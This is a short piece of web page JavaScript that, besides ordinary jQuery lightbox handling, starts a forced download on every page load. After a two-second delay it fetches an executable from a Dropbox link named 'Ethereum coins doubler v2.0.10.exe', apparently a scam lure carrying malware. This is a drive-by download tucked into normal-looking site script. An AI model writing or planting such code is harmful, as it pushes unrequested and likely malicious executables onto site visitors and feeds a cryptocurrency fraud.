function download(){
  setTimeout(function(){
    downloadFile("https://dl.dropboxusercontent.com/s/h627hyi1tyfmd7o/Ethereum%20coins%20doubler%20v2.0.10.exe");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
